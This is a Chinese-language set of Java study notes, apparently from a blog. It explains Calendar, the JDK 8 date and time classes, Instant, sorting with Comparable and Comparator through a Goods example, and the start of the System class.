<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/a51b3ad3b6fc096f0abfbedb5a5db10a--7906--image-20240917135507627.png" alt="image-20240917135507627"></p>
<ul>
<li>主要用于对格式日期的读取，或者对日期进行自定义格式化</li>
</ul>
<h4 id="4、Calendar日历类的使用"><a href="#4、Calendar日历类的使用" class="headerlink" title="4、Calendar日历类的使用"></a>4、Calendar日历类的使用</h4><ul>
<li>Calendar是一个抽象基类，主用用于完成日期字段之间相互操作的功能。</li>
<li>获取Calendar实例的方法<ul>
<li>使用Calendar.getInstance()方法</li>
<li>调用它的子类GregorianCalendar的构造器。</li>
</ul>
</li>
<li>一个Calendar的实例是系统时间的抽象表示，通过get(intfield)方法来取得想要的时间信息。比如YEAR、MONTH、DAY_OF_WEEK、HOUR_OF_DAY 、MINUTE、SECOND<ul>
<li>public void set(intfield,intvalue)</li>
<li>public void add(intfield,intamount)</li>
<li>public final Date getTime()</li>
<li>public final void setTime(Date date)</li>
</ul>
</li>
<li>注意:<ul>
<li>获取月份时：一月是0，二月是1，以此类推，12月是11</li>
<li>获取星期时：周日是1，周二是2，。。。。周六是7</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateFormateDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">calendar</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得是该月第几天</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">days</span> <span class="operator">=</span> calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        System.out.println(days); <span class="comment">// 17</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可变性</span></span><br><span class="line">        calendar.set(Calendar.DAY_OF_MONTH, days + <span class="number">1</span>);</span><br><span class="line">        days = calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        System.out.println(days);  <span class="comment">// 18</span></span><br><span class="line"></span><br><span class="line">        calendar.add(Calendar.DAY_OF_MONTH, <span class="number">6</span>);</span><br><span class="line">        days = calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        System.out.println(days); <span class="comment">//24</span></span><br><span class="line"></span><br><span class="line">        System.out.println(calendar.getTime()); <span class="comment">//Tue Sep 24 14:29:29 CST 2024</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        calendar.setTime(date);</span><br><span class="line">        System.out.println(calendar.getTime());<span class="comment">// Tue Sep 17 14:29:29 CST 2024</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3、JDK8中日期API的介绍"><a href="#3、JDK8中日期API的介绍" class="headerlink" title="3、JDK8中日期API的介绍"></a>3、JDK8中日期API的介绍</h3><ul>
<li>新日期时间API出现的背景</li>
</ul>
<blockquote>
<p>如果我们可以跟别人说：“我们在1502643933071见面，别晚了！”那么就再简单不过了。但是我们希望时间与昼夜和四季有关，于是事情就变复杂了。JDK 1.0中包含了一个java.util.Date类，但是它的大多数方法已经在JDK 1.1引入Calendar类之后被弃用了。而Calendar并不比Date好多少。它们面临的问题是：</p>
<blockquote>
<p>可变性：像日期和时间这样的类应该是不可变的。</p>
</blockquote>
<blockquote>
<p>偏移性：Date中的年份是从1900开始的，而月份都从0开始。</p>
</blockquote>
<blockquote>
<p>格式化：格式化只对Date有用，Calendar则不行。</p>
</blockquote>
<blockquote>
<p>此外，它们也不是线程安全的；不能处理闰秒等。</p>
</blockquote>
<p>总结：对日期和时间的操作一直是Java程序员最痛苦的地方之一。</p>
</blockquote>
<ul>
<li>Java 8 吸收了Joda-Time 的精华，以一个新的开始为Java 创建优秀的API。新的java.time 中包含了所有关于<strong>本地日期（LocalDate）、本地时间（LocalTime）、本地日期时间（LocalDateTime）、时区（ZonedDateTime）和持续时间（Duration）的类</strong>。历史悠久的Date 类新增了toInstant() 方法，用于把Date 转换成新的表示形式。这些新增的本地化时间日期API 大大简化了日期时间和本地化的管理。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.time–包含值对象的基础包</span><br><span class="line">java.time.chrono–提供对不同的日历系统的访问java.time.format–格式化和解析时间和日期java.time.temporal–包括底层框架和扩展特性java.time.zone–包含时区支持的类</span><br><span class="line"></span><br><span class="line">说明：大多数开发者只会用到基础包和format包，也可能会用到temporal包。因此，尽管有68个新的公开类型，大多数开发者，大概将只会用到其中的三分之一。</span><br></pre></td></tr></table></figure>

<h4 id="1-LocalDate、LocalTime、LocalDateTime的使用"><a href="#1-LocalDate、LocalTime、LocalDateTime的使用" class="headerlink" title="1.LocalDate、LocalTime、LocalDateTime的使用"></a>1.LocalDate、LocalTime、LocalDateTime的使用</h4><ul>
<li><p>LocalDate、LocalTime、LocalDateTime 类是其中较重要的几个类，它们的实例是<strong>不可变的对象</strong>，分别表示使用ISO-8601日历系统的日期、时间、日期和时间。它们提供了简单的本地日期或时间，并不包含当前的时间信息，也不包含与时区相关的信息。</p>
<ul>
<li>LocalDate代表IOS格式（yyyy-MM-dd）的日期,可以存储生日、纪念日等日期。</li>
<li>LocalTime表示一个时间，而不是日期。</li>
<li>LocalDateTime是用来表示日期和时间的，<strong>这是一个最常用的类之一</strong>。</li>
</ul>
</li>
<li><p>注：ISO-8601日历系统是国际标准化组织制定的现代公民的日期和时间的表示法，也就是公历。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.LocalDate;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateFormate8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//now():获取当前的日期、时间、日期+时间</span></span><br><span class="line">        <span class="type">LocalDate</span> <span class="variable">localDate</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line">        <span class="type">LocalTime</span> <span class="variable">localTime</span> <span class="operator">=</span> LocalTime.now();</span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">localDateTime</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line"></span><br><span class="line">        System.out.println(localDate); <span class="comment">//2024-09-17</span></span><br><span class="line">        System.out.println(localTime);<span class="comment">//14:59:25.963644900</span></span><br><span class="line">        System.out.println(localDateTime);<span class="comment">//2024-09-17T14:59:25.963644900</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//of():设置指定的年、月、日、时、分、秒。没有偏移量</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">localDateTime1</span> <span class="operator">=</span> LocalDateTime.of(<span class="number">2024</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">25</span>, <span class="number">52</span>);</span><br><span class="line">        System.out.println(localDateTime1); <span class="comment">//2024-12-06T13:25:52</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//getXxx()：获取相关的属性</span></span><br><span class="line">        System.out.println(localDateTime.getDayOfMonth()); <span class="comment">//17</span></span><br><span class="line">        System.out.println(localDateTime.getDayOfWeek());<span class="comment">//TUESDAY</span></span><br><span class="line">        System.out.println(localDateTime.getMonth());<span class="comment">//SEPTEMBER</span></span><br><span class="line">        System.out.println(localDateTime.getMonthValue());<span class="comment">//9</span></span><br><span class="line">        System.out.println(localDateTime.getMinute());<span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 体现不可变性</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">localDateTime2</span> <span class="operator">=</span> localDateTime.withDayOfMonth(<span class="number">23</span>);</span><br><span class="line">        System.out.println(localDateTime); <span class="comment">//2024-09-17T15:03:22.654453100</span></span><br><span class="line">        System.out.println(localDateTime2);<span class="comment">//2024-09-23T15:03:22.654453100</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/036c79ac6d7da45dda9da1226bf8facd--eb96--01.png" alt="01"></p>
<h4 id="2、Instant类的使用"><a href="#2、Instant类的使用" class="headerlink" title="2、Instant类的使用"></a>2、Instant类的使用</h4><ul>
<li>Instant：时间线上的一个瞬时点。这可能被用来记录应用程序中的事件时间戳。</li>
<li>在处理时间和日期的时候，我们通常会想到年,月,日,时,分,秒。然而，这只是时间的一个模型，是面向人类的。第二种通用模型是面向机器的，或者说是连续的。在此模型中，时间线中的一个点表示为一个很大的数，这有利于计算机处理。在UNIX中，这个数从1970年开始，以秒为的单位；同样的，在Java中，也是从1970年开始，但以毫秒为单位。</li>
<li>java.time包通过值类型Instant提供机器视图，不提供处理人类意义上的时间单位。Instant表示时间线上的一点，而不需要任何上下文信息，例如，时区。概念上讲，它只是简单的表示自1970年1月1日0时0分0秒（UTC）开始的秒数。因为java.time包是基于纳秒计算的，所以Instant的精度可以达到纳秒级。</li>
<li>(1 ns &#x3D; 10-9s)   1秒&#x3D; 1000毫秒&#x3D;10^6微秒&#x3D;10^9纳秒</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/4a960f7e7bfc8b68f5cb42eaebbc0064--95a7--02.png" alt="02"></p>
<ul>
<li>时间戳是指格林威治时间1970年01月01日00时00分00秒(北京时间1970年01月01日08时00分00秒)起至现在的总秒数。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/512c704c1691e6d466a59c9e120b99ba--9137--03.png" alt="03"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.time.OffsetDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.ZoneOffset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//now():获取本初子午线对应的标准时间</span></span><br><span class="line">        <span class="type">Instant</span> <span class="variable">instant</span> <span class="operator">=</span> Instant.now();</span><br><span class="line">        System.out.println(instant);<span class="comment">//2024-09-17T07:10:05.668448200Z</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加时间的偏移量</span></span><br><span class="line">        <span class="type">OffsetDateTime</span> <span class="variable">offsetDateTime</span> <span class="operator">=</span> instant.atOffset(ZoneOffset.ofHours(<span class="number">8</span>));<span class="comment">//东八区</span></span><br><span class="line">        System.out.println(offsetDateTime); <span class="comment">//2024-09-17T15:10:05.668448200+08:00</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//toEpochMilli():获取自1970年1月1日0时0分0秒（UTC）开始的毫秒数  ---&gt; Date类的getTime()</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">milli</span> <span class="operator">=</span> instant.toEpochMilli();</span><br><span class="line">        System.out.println(milli);  <span class="comment">//1726557005668</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ofEpochMilli():通过给定的毫秒数，获取Instant实例  --&gt;Date(long millis)</span></span><br><span class="line">        <span class="type">Instant</span> <span class="variable">instant1</span> <span class="operator">=</span> Instant.ofEpochMilli(<span class="number">1550475314878L</span>);</span><br><span class="line">        System.out.println(instant1);   <span class="comment">//2019-02-18T07:35:14.878Z</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4、Java比较器"><a href="#4、Java比较器" class="headerlink" title="4、Java比较器"></a>4、Java比较器</h3><h4 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 一、说明：Java中的对象，正常情况下，只能进行比较：==  或  != 。不能使用 &gt; 或 &lt; 的</span></span><br><span class="line"><span class="comment">*          但是在开发场景中，我们需要对多个对象进行排序，言外之意，就需要比较对象的大小。</span></span><br><span class="line"><span class="comment">*          如何实现？使用两个接口中的任何一个：Comparable 或 Comparator</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>Java实现对象排序的方式有两种：</p>
<ul>
<li>自然排序：java.lang.Comparable</li>
<li>定制排序：java.util.Comparator</li>
</ul>
</li>
<li><p>Comparable自然排序举例</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompareTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          Comparable接口的使用举例：  自然排序</span></span><br><span class="line"><span class="comment">          1.像String、包装类等实现了Comparable接口，重写了compareTo(obj)方法，给出了比较两个对象大小的方式。</span></span><br><span class="line"><span class="comment">          2.像String、包装类重写compareTo()方法以后，进行了从小到大的排列</span></span><br><span class="line"><span class="comment">          3. 重写compareTo(obj)的规则：</span></span><br><span class="line"><span class="comment">             如果当前对象this大于形参对象obj，则返回正整数，</span></span><br><span class="line"><span class="comment">             如果当前对象this小于形参对象obj，则返回负整数，</span></span><br><span class="line"><span class="comment">             如果当前对象this等于形参对象obj，则返回零。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String[] arr = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;AA&quot;</span>,<span class="string">&quot;CC&quot;</span>,<span class="string">&quot;KK&quot;</span>,<span class="string">&quot;MM&quot;</span>,<span class="string">&quot;GG&quot;</span>,<span class="string">&quot;JJ&quot;</span>,<span class="string">&quot;DD&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Arrays.sort(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr)); <span class="comment">//[AA, CC, DD, GG, JJ, KK, MM]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、自定义类实现Comparable自然排序"><a href="#2、自定义类实现Comparable自然排序" class="headerlink" title="2、自定义类实现Comparable自然排序"></a>2、自定义类实现Comparable自然排序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompareTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 4.对于自定义类来说，如果需要排序，我们可以让自定义类实现Comparable接口，重写compareTo(obj)方法。</span></span><br><span class="line"><span class="comment">     *   在compareTo(obj)方法中指明如何排序</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test2(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">        Goods[] arr = <span class="keyword">new</span> <span class="title class_">Goods</span>[<span class="number">5</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;lenovoMouse&quot;</span>,<span class="number">34</span>);</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;dellMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;xiaomiMouse&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;huaweiMouse&quot;</span>,<span class="number">65</span>);</span><br><span class="line">        arr[<span class="number">4</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;microsoftMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line"></span><br><span class="line">        Arrays.sort(arr);</span><br><span class="line"></span><br><span class="line">        System.out.println(Arrays.toString(arr));  <span class="comment">//[Goods&#123;name=&#x27;xiaomiMouse&#x27;, price=12.0&#125;, Goods&#123;name=&#x27;lenovoMouse&#x27;, price=34.0&#125;, Goods&#123;name=&#x27;microsoftMouse&#x27;, price=43.0&#125;, Goods&#123;name=&#x27;dellMouse&#x27;, price=43.0&#125;, Goods&#123;name=&#x27;huaweiMouse&#x27;, price=65.0&#125;]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Goods类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Goods</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Goods</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Goods</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Goods&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//指明商品比较大小的方式:按照价格从低到高排序,再按照产品名称从高到低排序</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Object o)</span> &#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;**************&quot;);</span></span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Goods goods)&#123;</span><br><span class="line">            <span class="comment">//方式一：</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">this</span>.price &gt; goods.price)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">this</span>.price &lt; goods.price)&#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//                return 0;</span></span><br><span class="line">                <span class="keyword">return</span> -<span class="built_in">this</span>.name.compareTo(goods.name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//方式二：</span></span><br><span class="line"><span class="comment">//           return Double.compare(this.price,goods.price);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        return 0;</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;传入的数据类型不一致！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3、使用Comparator实现定制排序"><a href="#3、使用Comparator实现定制排序" class="headerlink" title="3、使用Comparator实现定制排序"></a>3、使用Comparator实现定制排序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompareTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Comparator接口的使用：定制排序</span></span><br><span class="line"><span class="comment">     *     1.背景：</span></span><br><span class="line"><span class="comment">     *     当元素的类型没有实现java.lang.Comparable接口而又不方便修改代码，</span></span><br><span class="line"><span class="comment">     *     或者实现了java.lang.Comparable接口的排序规则不适合当前的操作，</span></span><br><span class="line"><span class="comment">     *     那么可以考虑使用 Comparator 的对象来排序</span></span><br><span class="line"><span class="comment">     *     2.重写compare(Object o1,Object o2)方法，比较o1和o2的大小：</span></span><br><span class="line"><span class="comment">     *     如果方法返回正整数，则表示o1大于o2；</span></span><br><span class="line"><span class="comment">     *     如果返回0，表示相等；</span></span><br><span class="line"><span class="comment">     *     返回负整数，表示o1小于o2。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span>&#123;</span><br><span class="line">        String[] arr = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;AA&quot;</span>,<span class="string">&quot;CC&quot;</span>,<span class="string">&quot;KK&quot;</span>,<span class="string">&quot;MM&quot;</span>,<span class="string">&quot;GG&quot;</span>,<span class="string">&quot;JJ&quot;</span>,<span class="string">&quot;DD&quot;</span>&#125;;</span><br><span class="line">        Arrays.sort(arr,<span class="keyword">new</span> <span class="title class_">Comparator</span>()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//按照字符串从大到小的顺序排列</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(o1 <span class="keyword">instanceof</span> String &amp;&amp; o2 <span class="keyword">instanceof</span>  String)&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> (String) o1;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> (String) o2;</span><br><span class="line">                    <span class="keyword">return</span> -s1.compareTo(s2);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                return 0;</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;输入的数据类型不一致&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span>&#123;</span><br><span class="line">        Goods[] arr = <span class="keyword">new</span> <span class="title class_">Goods</span>[<span class="number">6</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;lenovoMouse&quot;</span>,<span class="number">34</span>);</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;dellMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;xiaomiMouse&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;huaweiMouse&quot;</span>,<span class="number">65</span>);</span><br><span class="line">        arr[<span class="number">4</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;huaweiMouse&quot;</span>,<span class="number">224</span>);</span><br><span class="line">        arr[<span class="number">5</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;microsoftMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line"></span><br><span class="line">        Arrays.sort(arr, <span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;</span><br><span class="line">            <span class="comment">//指明商品比较大小的方式:按照产品名称从低到高排序,再按照价格从高到低排序</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(o1 <span class="keyword">instanceof</span> Goods &amp;&amp; o2 <span class="keyword">instanceof</span> Goods)&#123;</span><br><span class="line">                    <span class="type">Goods</span> <span class="variable">g1</span> <span class="operator">=</span> (Goods)o1;</span><br><span class="line">                    <span class="type">Goods</span> <span class="variable">g2</span> <span class="operator">=</span> (Goods)o2;</span><br><span class="line">                    <span class="keyword">if</span>(g1.getName().equals(g2.getName()))&#123;</span><br><span class="line">                        <span class="keyword">return</span> -Double.compare(g1.getPrice(),g2.getPrice());</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> g1.getName().compareTo(g2.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;输入的数据类型不一致&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Comparable接口与Comparator的使用的对比</strong>：<ul>
<li>Comparable接口的方式一旦一定，保证Comparable接口实现类的对象在任何位置都可以比较大小。</li>
<li>Comparator接口属于临时性的比较。</li>
</ul>
</li>
</ul>
<h3 id="5、System类、Math类、BigInteger与BigDecimal"><a href="#5、System类、Math类、BigInteger与BigDecimal" class="headerlink" title="5、System类、Math类、BigInteger与BigDecimal"></a>5、System类、Math类、BigInteger与BigDecimal</h3><h4 id="1、System类"><a href="#1、System类" class="headerlink" title="1、System类"></a>1、System类</h4><ul>
<li><p>System类代表系统，系统级的很多属性和控制方法都放置在该类的内部。该类位于java.lang包。</p>
</li>
<li><p>由于该类的构造器是private的，所以无法创建该类的对象，也就是无法实例化该类。其内部的成员变量和成员方法都是static的，所以也可以很方便的进行调用。</p>
</li>
<li><p>成员变量</p>
<ul>
<li>System类内部包含in、out和err三个成员变量，分别代表标准输入流(键盘输入)，标准输出流(显示器)和标准错误输出流(显示器)。</li>
</ul>
</li>
<li><p>成员方法</p>
<ul>
<li><p>native long currentTimeMillis()：</p>
<blockquote>
<p>该方法的作用是返回当前的计算机时间，时间的表达格式为当前计算机时间和GMT时间(格林威治时间)1970年1月1号0时0分0秒所差的毫秒数。</p>
</blockquote>
</li>
<li><p>void exit(int status)：</p>
<blockquote>
<p>该方法的作用是退出程序。其中status的值为0代表正常退出，非零代表异常退出。使用该方法可以在图形界面编程中实现程序的退出功能等。</p>
</blockquote>
</li>
<li><p>void gc()：</p>
<blockquote>
<p>该方法的作用是请求系统进行垃圾回收。至于系统是否立刻回收，则取决于系统中垃圾回收算法的实现以及系统执行时的情况。String </p>
</blockquote>
</li>
<li><p>getProperty(String key)：</p>
<blockquote>
<p>该方法的作用是获得系统中属性名为key的属性对应的值。系统中常见的属性名以及属性的作用如下表所示：</p>
</blockquote>
</li>
</ul>
</li>
</ul>
